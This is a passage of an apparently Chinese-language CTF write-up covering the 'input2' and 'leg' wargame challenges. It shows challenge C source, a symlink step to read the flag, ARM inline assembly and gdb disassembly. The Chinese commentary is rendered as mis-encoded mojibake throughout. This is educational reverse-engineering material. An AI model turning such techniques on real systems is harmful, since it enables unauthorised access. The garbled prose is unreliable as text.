        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">memcmp</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"\x00\x0a\x02\xff"</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Stage 2 clear!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  
  <span class="token comment">// env</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token string">"\xca\xfe\xba\xbe"</span><span class="token punctuation">,</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"\xde\xad\xbe\xef"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Stage 3 clear!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token comment">// file</span>
  FILE<span class="token operator">*</span> fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"\x0a"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>fp<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">fread</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> fp<span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">1</span> <span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">memcmp</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"\x00\x00\x00\x00"</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Stage 4 clear!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	

  <span class="token comment">// network</span>
  <span class="token class-name"><span class="token keyword">int</span></span> sd<span class="token punctuation">,</span> cd<span class="token punctuation">;</span>
  <span class="token keyword">struct</span> <span class="token class-name">sockaddr_in</span> saddr<span class="token punctuation">,</span> caddr<span class="token punctuation">;</span>
  sd <span class="token operator">=</span> <span class="token function">socket</span><span class="token punctuation">(</span>AF_INET<span class="token punctuation">,</span> SOCK_STREAM<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span>sd <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"socket error, tell admin\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  saddr<span class="token punctuation">.</span>sin_family <span class="token operator">=</span> AF_INET<span class="token punctuation">;</span>
  saddr<span class="token punctuation">.</span>sin_addr<span class="token punctuation">.</span>s_addr <span class="token operator">=</span> INADDR_ANY<span class="token punctuation">;</span>
  saddr<span class="token punctuation">.</span>sin_port <span class="token operator">=</span> <span class="token function">htons</span><span class="token punctuation">(</span> <span class="token function">atoi</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token char">'C'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">bind</span><span class="token punctuation">(</span>sd<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">sockaddr</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>saddr<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token type-expression class-name">saddr</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"bind error, use another port\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    		<span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token function">listen</span><span class="token punctuation">(</span>sd<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token class-name"><span class="token keyword">int</span></span> c <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token type-expression class-name"><span class="token keyword">struct</span> sockaddr_in</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  cd <span class="token operator">=</span> <span class="token function">accept</span><span class="token punctuation">(</span>sd<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">sockaddr</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>caddr<span class="token punctuation">,</span> <span class="token punctuation">(</span>socklen_t<span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span>cd <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"accept error, tell admin\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">recv</span><span class="token punctuation">(</span>cd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">4</span> <span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">memcmp</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"\xde\xad\xbe\xef"</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Stage 5 clear!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token comment">// here's your flag</span>
  <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/cat flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
<p>å°±ä¸€æ­¥æ­¥æ…¢æ…¢è¿‡å°±è¡Œï¼Œä½†æ˜¯æˆ‘å½“æ—¶é‡åˆ°ä¸ªé—®é¢˜ï¼Œå°±æ˜¯ä»–æœ¬åœ°ä¸å¯ä»¥åˆ›å»ºæ–‡ä»¶ï¼Œå°±å¾ˆçƒ¦ã€‚ç„¶åçœ‹äº†çœ‹ç½‘ä¸Šçš„æ–‡ç« è¯´å¯ä»¥ä¸Šä¼ åˆ°&#x2F;tmpç›®å½•ï¼Œä½†æ˜¯å‘¢ï¼ï¼ï¼æ²¡æ‰¾åˆ°äººæ€ä¹ˆä¸Šä¼ ï¼Œæ‰€ä»¥æˆ‘åœ¨è¿™é‡Œå£°æ˜ä¸€ä¸‹ï¼Œçœå»è¯»è€…æŸ¥æ‰¾ï¼Œå‰é¢æ˜¯æœ¬åœ°éœ€è¦ä¸Šä¼ çš„æ–‡ä»¶ï¼Œåé¢æ˜¯ä¸Šä¼ åˆ°æœåŠ¡å™¨çš„è·¯å¾„ã€‚ï¼ˆshellæˆ‘è‡ªå·±åˆ›å»ºçš„ç›®å½•ï¼‰</p>
<p><img src="https://s2.loli.net/2024/08/19/rIwHJ79c2pME1SO.png" alt="d6d1ccde997745838b92ee2b64382feb.png"></p>
<p>æœ€ågccç¼–è¯‘ä¸€ä¸‹ï¼Œå†è½¯é“¾æ¥ä¸€ä¸‹å°±å¥½äº†ã€‚æ‰“è¿‡pwn.collegeçš„äººåº”è¯¥çŸ¥é“ã€‚</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ln</span> <span class="token parameter variable">-s</span> /home/input2/flag flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
<p>æœ€åå¾—åˆ°flag!</p>
<p><img src="https://s2.loli.net/2024/08/19/Gkw5XDjcYhvAxFe.png" alt="c81b16adb98b41f1adaa1811b8c09d2e.png"></p>
<h5 id="ç¬¬å…«é¢˜-leg"><a href="#ç¬¬å…«é¢˜-leg" class="headerlink" title="ç¬¬å…«é¢˜-leg"></a>ç¬¬å…«é¢˜-leg</h5><p>è¿™é¢˜æ˜¯ä¸ªå¼‚æ¶æ„æ±‡ç¼–é¢˜ï¼Œä½†è€ƒçš„å¾ˆç®€å•</p>
<pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp"><span class="token preprocessor property">#include &lt;stdio.h></span>
<span class="token preprocessor property">#include &lt;fcntl.h></span>
<span class="token return-type class-name"><span class="token keyword">int</span></span> <span class="token function">key1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token function">asm</span><span class="token punctuation">(</span><span class="token string">"mov r3, pc\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token return-type class-name"><span class="token keyword">int</span></span> <span class="token function">key2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token function">asm</span><span class="token punctuation">(</span>
  <span class="token string">"push	&#123;r6&#125;\n"</span>
  <span class="token string">"add	r6, pc, $1\n"</span>
  <span class="token string">"bx	r6\n"</span>
  <span class="token string">".code   16\n"</span>
  <span class="token string">"mov	r3, pc\n"</span>
  <span class="token string">"add	r3, $0x4\n"</span>
  <span class="token string">"push	&#123;r3&#125;\n"</span>
  <span class="token string">"pop	&#123;pc&#125;\n"</span>
  <span class="token string">".code	32\n"</span>
  <span class="token string">"pop	&#123;r6&#125;\n"</span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token return-type class-name"><span class="token keyword">int</span></span> <span class="token function">key3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token function">asm</span><span class="token punctuation">(</span><span class="token string">"mov r3, lr\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token return-type class-name"><span class="token keyword">int</span></span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token class-name"><span class="token keyword">int</span></span> key<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Daddy has very strong arm! : "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token function">key1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">key2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">key3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> key <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Congratz!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name"><span class="token keyword">int</span></span> fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token class-name"><span class="token keyword">int</span></span> r <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"I have strong leg :P\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
<p>ä»æºç ä¸­å¯ä»¥çœ‹å‡ºæ¥å°±æ˜¯ç®—å‡ºæ¥é‚£ä¸‰ä¸ªkeyå°±å®Œäº‹äº†ã€‚</p>
<p>æœ‰ä¸€ä¸ªleg.asmæ–‡ä»¶ï¼Œè¿™é‡Œç›´æ¥æ”¾åˆ°æ–‡æœ¬ç¼–è¾‘å™¨æ‰“å¼€å°±å¯ä»¥äº†ã€‚å¯„å­˜å™¨éƒ½æ˜¯rå¼€å¤´å¤šï¼Œå°±æ˜¯armæ¶æ„ä¸‹çš„</p>
<pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> disass main
Dump of assembler code <span class="token keyword">for</span> <span class="token class-name">function</span> main<span class="token punctuation">:</span>
   <span class="token number">0x00008d3c</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">0</span><span class="token operator">></span><span class="token punctuation">:</span>	push	<span class="token punctuation">&#123;</span>r4<span class="token punctuation">,</span> r11<span class="token punctuation">,</span> lr<span class="token punctuation">&#125;</span>
   <span class="token number">0x00008d40</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">4</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token keyword">add</span>	r11<span class="token punctuation">,</span> sp<span class="token punctuation">,</span> #<span class="token number">8</span>
   <span class="token number">0x00008d44</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">8</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token class-name">sub</span>	sp<span class="token punctuation">,</span> sp<span class="token punctuation">,</span> #<span class="token number">12</span>
   <span class="token number">0x00008d48</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">12</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token class-name">mov</span>	r3<span class="token punctuation">,</span> #<span class="token number">0</span>
   <span class="token number">0x00008d4c</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">16</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token class-name">str</span>	r3<span class="token punctuation">,</span> <span class="token punctuation">[</span>r11<span class="token punctuation">,</span> #<span class="token operator">-</span><span class="token number">16</span><span class="token punctuation">]</span>
   <span class="token number">0x00008d50</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">20</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token class-name">ldr</span>	r0<span class="token punctuation">,</span> <span class="token punctuation">[</span>pc<span class="token punctuation">,</span> #<span class="token number">104</span><span class="token punctuation">]</span>	<span class="token punctuation">;</span> <span class="token number">0x8dc0</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">132</span><span class="token operator">></span>
   <span class="token number">0x00008d54</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">24</span><span class="token operator">></span><span class="token punctuation">:</span>	bl	<span class="token number">0xfb6c</span> <span class="token operator">&lt;</span>printf<span class="token operator">></span>
   <span class="token number">0x00008d58</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">28</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token class-name">sub</span>	r3<span class="token punctuation">,</span> r11<span class="token punctuation">,</span> #<span class="token number">16</span>
   <span class="token number">0x00008d5c</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">32</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token class-name">ldr</span>	r0<span class="token punctuation">,</span> <span class="token punctuation">[</span>pc<span class="token punctuation">,</span> #<span class="token number">96</span><span class="token punctuation">]</span>	<span class="token punctuation">;</span> <span class="token number">0x8dc4</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">136</span><span class="token operator">></span>
   <span class="token number">0x00008d60</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">36</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token class-name">mov</span>	r1<span class="token punctuation">,</span> r3
   <span class="token number">0x00008d64</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">40</span><span class="token operator">></span><span class="token punctuation">:</span>	bl	<span class="token number">0xfbd8</span> <span class="token operator">&lt;</span>__isoc99_scanf<span class="token operator">></span>
   <span class="token number">0x00008d68</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">44</span><span class="token operator">></span><span class="token punctuation">:</span>	bl	<span class="token number">0x8cd4</span> <span class="token operator">&lt;</span>key1<span class="token operator">></span>
   <span class="token number">0x00008d6c</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">48</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token class-name">mov</span>	r4<span class="token punctuation">,</span> r0
   <span class="token number">0x00008d70</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">52</span><span class="token operator">></span><span class="token punctuation">:</span>	bl	<span class="token number">0x8cf0</span> <span class="token operator">&lt;</span>key2<span class="token operator">></span>
   <span class="token number">0x00008d74</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">56</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token class-name">mov</span>	r3<span class="token punctuation">,</span> r0
   <span class="token number">0x00008d78</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">60</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token keyword">add</span>	r4<span class="token punctuation">,</span> r4<span class="token punctuation">,</span> r3
   <span class="token number">0x00008d7c</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">64</span><span class="token operator">></span><span class="token punctuation">:</span>	bl	<span class="token number">0x8d20</span> <span class="token operator">&lt;</span>key3<span class="token operator">></span>
   <span class="token number">0x00008d80</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">68</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token class-name">mov</span>	r3<span class="token punctuation">,</span> r0
   <span class="token number">0x00008d84</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">72</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token keyword">add</span>	r2<span class="token punctuation">,</span> r4<span class="token punctuation">,</span> r3
   <span class="token number">0x00008d88</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">76</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token class-name">ldr</span>	r3<span class="token punctuation">,</span> <span class="token punctuation">[</span>r11<span class="token punctuation">,</span> #<span class="token operator">-</span><span class="token number">16</span><span class="token punctuation">]</span>
   <span class="token number">0x00008d8c</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">80</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token class-name">cmp</span>	r2<span class="token punctuation">,</span> r3
   <span class="token number">0x00008d90</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">84</span><span class="token operator">></span><span class="token punctuation">:</span>	bne	<span class="token number">0x8da8</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">108</span><span class="token operator">></span>
   <span class="token number">0x00008d94</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">88</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token class-name">ldr</span>	r0<span class="token punctuation">,</span> <span class="token punctuation">[</span>pc<span class="token punctuation">,</span> #<span class="token number">44</span><span class="token punctuation">]</span>	<span class="token punctuation">;</span> <span class="token number">0x8dc8</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">140</span><span class="token operator">></span>
   <span class="token number">0x00008d98</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">92</span><span class="token operator">></span><span class="token punctuation">:</span>	bl	<span class="token number">0x1050c</span> <span class="token operator">&lt;</span>puts<span class="token operator">></span>
   <span class="token number">0x00008d9c</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">96</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token class-name">ldr</span>	r0<span class="token punctuation">,</span> <span class="token punctuation">[</span>pc<span class="token punctuation">,</span> #<span class="token number">40</span><span class="token punctuation">]</span>	<span class="token punctuation">;</span> <span class="token number">0x8dcc</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">144</span><span class="token operator">></span>
   <span class="token number">0x00008da0</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">100</span><span class="token operator">></span><span class="token punctuation">:</span>	bl	<span class="token number">0xf89c</span> <span class="token operator">&lt;</span>system<span class="token operator">></span>
   <span class="token number">0x00008da4</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">104</span><span class="token operator">></span><span class="token punctuation">:</span>	b	<span class="token number">0x8db0</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">116</span><span class="token operator">></span>
   <span class="token number">0x00008da8</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">108</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token class-name">ldr</span>	r0<span class="token punctuation">,</span> <span class="token punctuation">[</span>pc<span class="token punctuation">,</span> #<span class="token number">32</span><span class="token punctuation">]</span>	<span class="token punctuation">;</span> <span class="token number">0x8dd0</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">148</span><span class="token operator">></span>
   <span class="token number">0x00008dac</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">112</span><span class="token operator">></span><span class="token punctuation">:</span>	bl	<span class="token number">0x1050c</span> <span class="token operator">&lt;</span>puts<span class="token operator">></span>
   <span class="token number">0x00008db0</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">116</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token class-name">mov</span>	r3<span class="token punctuation">,</span> #<span class="token number">0</span>
   <span class="token number">0x00008db4</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">120</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token class-name">mov</span>	r0<span class="token punctuation">,</span> r3
   <span class="token number">0x00008db8</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">124</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token class-name">sub</span>	sp<span class="token punctuation">,</span> r11<span class="token punctuation">,</span> #<span class="token number">8</span>
   <span class="token number">0x00008dbc</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">128</span><span class="token operator">></span><span class="token punctuation">:</span>	pop	<span class="token punctuation">&#123;</span>r4<span class="token punctuation">,</span> r11<span class="token punctuation">,</span> pc<span class="token punctuation">&#125;</span>
   <span class="token number">0x00008dc0</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">132</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token class-name">andeq</span>	r10<span class="token punctuation">,</span> r6<span class="token punctuation">,</span> r12<span class="token punctuation">,</span> lsl #<span class="token number">9</span>
   <span class="token number">0x00008dc4</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">136</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token class-name">andeq</span>	r10<span class="token punctuation">,</span> r6<span class="token punctuation">,</span> r12<span class="token punctuation">,</span> lsr #<span class="token number">9</span>
   <span class="token number">0x00008dc8</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">140</span><span class="token operator">></span><span class="token punctuation">:</span>			<span class="token punctuation">;</span> <span class="token operator">&lt;</span>UNDEFINED<span class="token operator">></span> instruction<span class="token punctuation">:</span> <span class="token number">0x0006a4b0</span>
   <span class="token number">0x00008dcc</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">144</span><span class="token operator">></span><span class="token punctuation">:</span>			<span class="token punctuation">;</span> <span class="token operator">&lt;</span>UNDEFINED<span class="token operator">></span> instruction<span class="token punctuation">:</span> <span class="token number">0x0006a4bc</span>
   <span class="token number">0x00008dd0</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">148</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token class-name">andeq</span>	r10<span class="token punctuation">,</span> r6<span class="token punctuation">,</span> r4<span class="token punctuation">,</span> asr #<span class="token number">9</span>
End of assembler dump<span class="token punctuation">.</span>
<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> disass key1
Dump of assembler code <span class="token keyword">for</span> <span class="token class-name">function</span> key1<span class="token punctuation">:</span>
   <span class="token number">0x00008cd4</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">0</span><span class="token operator">></span><span class="token punctuation">:</span>	push	<span class="token punctuation">&#123;</span>r11<span class="token punctuation">&#125;</span>		<span class="token punctuation">;</span> <span class="token punctuation">(</span><span class="token class-name">str</span> r11<span class="token punctuation">,</span> <span class="token punctuation">[</span>sp<span class="token punctuation">,</span> #<span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">!</span><span class="token punctuation">)</span>
   <span class="token number">0x00008cd8</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">4</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token keyword">add</span>	r11<span class="token punctuation">,</span> sp<span class="token punctuation">,</span> #<span class="token number">0</span>
   <span class="token number">0x00008cdc</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">8</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token class-name">mov</span>	r3<span class="token punctuation">,</span> pc
   <span class="token number">0x00008ce0</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">12</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token class-name">mov</span>	r0<span class="token punctuation">,</span> r3
   <span class="token number">0x00008ce4</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">16</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token class-name">sub</span>	sp<span class="token punctuation">,</span> r11<span class="token punctuation">,</span> #<span class="token number">0</span>
